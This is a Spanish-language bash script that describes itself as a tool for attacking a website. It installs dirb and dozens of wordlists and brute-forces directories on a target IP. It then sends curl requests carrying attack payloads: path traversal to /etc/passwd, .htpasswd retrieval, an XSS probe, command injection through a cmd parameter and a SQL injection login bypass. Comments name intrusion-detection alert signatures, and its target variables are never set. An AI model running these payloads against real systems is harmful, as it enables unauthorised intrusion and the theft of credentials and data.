#!/bin/bash

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para instalar realizar ataques a una web
#
# Ejecución remota con sudo:
#   curl -sL x | sudo bash
#
# Ejecución remota como root:
#   curl -sL x | bash
#
# Ejecución remota sin caché:
#   curl -sL -H 'Cache-Control: no-cache, no-store' x | bash
#
# Ejecución remota con parámetros:
#   curl -sL x | bash -s Parámetro1 Parámetro2
#
# Bajar y editar directamente el archivo en nano
#   curl -sL x | nano -
# ----------

# Definir constantes de color
  cColorAzul="\033[0;34m"
  cColorAzulClaro="\033[1;34m"
  cColorVerde='\033[1;32m'
  cColorRojo='\033[1;31m'
  # Para el color rojo también:
    #echo "$(tput setaf 1)Mensaje en color rojo. $(tput sgr 0)"
  cFinColor='\033[0m'

# Comprobar si el script está corriendo como root
  #if [ $(id -u) -ne 0 ]; then     # Sólo comprueba si es root
  if [[ $EUID -ne 0 ]]; then       # Comprueba si es root o sudo
    echo ""
    echo -e "${cColorRojo}  Este script está preparado para ejecutarse con privilegios de administrador (como root o con sudo).${cFinColor}"
    echo ""
    exit
  fi

# Comprobar si el paquete dirb está instalado. Si no lo está, instalarlo.
  if [[ $(dpkg-query -s dirb 2>/dev/null | grep installed) == "" ]]; then
    echo ""
    echo -e "${cColorRojo}  El paquete dirb no está instalado. Iniciando su instalación...${cFinColor}"
    echo ""
    apt-get -y update
    apt-get -y install dirb
    echo ""
  fi

# Instalar diccionarios
  apt-get -y install wbulgarian
  apt-get -y install wesperanto
  apt-get -y install wirish
  apt-get -y install wmanx
  apt-get -y install wukrainian
  apt-get -y install wgerman-medical
  apt-get -y install wamerican-huge
  apt-get -y install wamerican-insane
  apt-get -y install wamerican-large
  apt-get -y install wamerican-small
  apt-get -y install wbritish-huge
  apt-get -y install wbritish-insane
  apt-get -y install wbritish-large
  apt-get -y install wbritish-small
  apt-get -y install wcanadian
  apt-get -y install wcanadian-huge
  apt-get -y install wcanadian-insane
  apt-get -y install wcanadian-large
  apt-get -y install wcanadian-small
  apt-get -y install wcatalan
  apt-get -y install wswedish
  apt-get -y install wfrench
  apt-get -y install witalian
  apt-get -y install wspanish
  apt-get -y install wordlist
  apt-get -y install scowl

# Escaneo de archivos y directorios basado en los diccionarios instalados
  
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/american-english-insane -w
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/british-english-insane  -w
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/canadian-english-insane -w
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/bulgarian               -w
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/catalan                 -w
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/esperanto               -w
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/french                  -w
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/german-medical          -w
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/irish                   -w
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/italian                 -w
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/manx                    -w
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/spanish                 -w
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/swedish                 -w
  dirb http://"$vIP":"$vPuerto" /usr/share/dict/ukranian                -w
  find /usr/share/dict/scowl/ -type f -exec dirb http://"$vIP":"$vPuerto" {} -w \; | grep "CODE:2"





# Alerta: Web.Server.Password.File.Access
  curl -X GET "http://"$vIP":80/../../etc/passwd"

# Alerta: HTPasswd.Access
  curl -X GET "http://"$vIP":80/.htpasswd"

# Alerta: Cross.Site.Scripting
  curl -X GET "http://"$vIP":80/search?query=<script>alert('XSS')</script>"

# Alerta: Generic.Path.Traversal.Detection
  curl -X GET "http://"$vIP":80/index.php?page=../../../../etc/passwd"

# Alerta: Comtrend.Devices.Information.Disclosure
  dirb http://"$vIP":80 -X .html,.js,.txt,.log









# Buscar subdirectorios recursivamente
  dirb http://"$vIP":80 -r

curl -X GET "http://"$vIP":80/?cmd=ls"
curl -X GET "http://"$vIP":80/?cmd=whoami;uname -a"







# Simular un agente específico
  dirb http://"$vIP":80 -a "DirBrowser ()"

# Forzar HTTPS o Cambiar Puerto
  dirb https://"$vIP":8443



# Ignorar Respuestas Personalizadas
  # Si el servidor responde con una página personalizada en lugar de 404 Not Found, puedes indicar a Dirb que ignore respuestas específicas.
  # Por ejemplo, ignorar respuestas HTTP con código 403 (prohibido)
  dirb http://"$vIP":80 -N 403

# Enumeración de archivos sensibles, buscando configuraciones expuestas o backups:
  dirb http://"$vIP":80 /usr/share/dirb/wordlists/vulns/common.txt -X .conf,.bak,.old,.log

# Pruebas de Rutas Privadas, usando un diccionario para detectar rutas administrativas:
  dirb http://"$vIP":80 /usr/share/dirb/wordlists/vulns/admin.txt

# Detección de configuraciones de Apache:
  dirb http://"$vIP":80 /usr/share/dirb/wordlists/vulns/apache.txt


# SQL Injection
  #
  curl -X GET "http://"$vIP":80/login?username=admin'--&password="